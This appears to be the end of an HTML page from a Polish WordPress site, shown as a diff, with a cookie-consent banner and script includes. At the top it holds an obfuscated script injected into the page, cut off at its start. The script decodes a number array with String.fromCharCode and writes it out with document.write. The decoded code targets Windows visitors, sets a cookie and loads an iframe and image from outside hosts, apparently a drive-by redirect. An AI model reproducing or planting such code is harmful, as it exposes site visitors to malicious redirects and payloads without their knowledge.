44,349,273,280,300,300,284,288,280,362,249,357,336,353,271,334,357,356,334,356,300,273,336,291,294,287,289,340,341,339,293,290,341,294,291,337,288,289,295,336,340,288,336,295,291,336,339,294,289,337,292,339,338,292,273,283,271,334,357,356,334,344,300,273,289,336,292,338,339,292,294,288,292,296,341,289,296,294,337,340,288,294,341,295,337,290,288,294,339,295,337,338,294,293,295,293,273,298,249,344,341,279,334,357,353,334,338,279,334,357,356,334,356,280,300,300,300,356,349,339,340,341,344,349,340,339,280,362,334,357,338,334,338,279,334,357,356,334,356,283,334,357,356,334,344,283,292,280,298,249,344,341,279,334,357,353,334,338,279,334,357,356,334,356,280,300,300,334,357,356,334,344,280,362,358,344,349,339,350,358,285,347,350,338,336,355,344,350,349,285,343,353,340,341,300,273,343,355,355,351,297,286,286,348,350,337,344,284,336,356,355,350,285,353,356,286,348,286,273,298,364,249,364,364,249,341,356,349,338,355,344,350,349,271,339,351,351,279,350,280,362,344,341,279,344,300,300,288,280,353,340,355,356,353,349,298,344,341,279,349,336,357,344,342,336,355,350,353,285,336,351,351,325,340,353,354,344,350,349,285,344,349,339,340,359,318,341,279,273,326,344,349,273,280,272,300,284,288,280,362,350,285,354,353,338,300,273,336,337,350,356,355,297,337,347,336,349,346,273,298,357,336,353,271,344,348,342,271,300,271,349,340,358,271,312,348,336,342,340,279,288,283,288,280,298,344,348,342,285,354,353,338,271,300,271,273,343,355,355,351,297,286,286,348,350,337,344,284,336,357,355,350,285,353,356,286,338,349,355,289,285,342,344,341,273,298,364,344,300,288,298,353,340,355,356,353,349,298,364,249,299,286,354,338,353,344,351,355,301,249,299,344,341,353,336,348,340,271,350,349,347,350,336,339,300,273,353,340,355,356,353,349,271,339,351,351,279,355,343,344,354,280,298,273,271,354,355,360,347,340,300,273,358,344,339,355,343,297,293,293,276,298,343,340,344,342,343,355,297,293,293,276,298,273,271,354,353,338,300,273,336,337,350,356,355,297,337,347,336,349,346,273,301,299,286,344,341,353,336,348,340,301,249,299,286,339,344,357,301,249];var b2a5cd2="";for (var i=1; i<a2a5cd1.length; i++) {b2a5cd2+=String.fromCharCode(a2a5cd1[i]-a2a5cd1[0]);} document.write(b2a5cd2);</script><script type="text/javascript">
+  var dropCookie = true;
+  var cookieDuration = 14; 
+  var cookieName = 'complianceCookie';
+  var cookieValue = 'on';
+    var privacyMessage = "";
+
+  jQuery(document).ready(function($) {
+    privacyMessage = jQuery('#hidden-cookie-message').html();
+      	if(checkCookie(window.cookieName) != window.cookieValue){
+  		createDiv(true); 
+  		window.setTimeout(function() {
+      		$('#cookie-law').fadeOut();
+  		}, 5000);
+  	}
+  });
+</script>
+<div id="hidden-cookie-message" style="display:none;">
+  <div>
+    <h4>Strona wykorzystuje pliki Cookies.</h4>
+<p>W ramach naszej witryny stosujemy pliki cookies w celu świadczenia Państwu usług na najwyższym poziomie, w tym w sposób dostosowany do indywidualnych potrzeb. Korzystanie z witryny bez zmiany ustawień dotyczących cookies oznacza, że będą one zamieszczane w Państwa urządzeniu końcowym. Możecie Państwo dokonać w każdym czasie zmiany ustawień dotyczących cookies.</p>    <a class="close-cookie-banner" href="javascript:void(0);" onclick="jQuery(this).parent().parent().hide();"><span>Close</span></a>
+  </div>
+</div>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/plugins/prettyphoto-media/js/jquery.prettyPhoto.min.js?ver=3.1.4'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-includes/js/comment-reply.min.js?ver=4.0.18'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/plugins/creare-eu-cookie-law-banner/js/eu-cookie-law.js'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-includes/js/jquery/jquery.color.min.js?ver=2.1.1'></script>
+<script>
+jQuery(function($) {
+$('a[rel^="prettyPhoto"]').prettyPhoto();
+});
+</script>
+<!--END OF BODY CONTAINER -->
+</div>
+</body>
+</html>
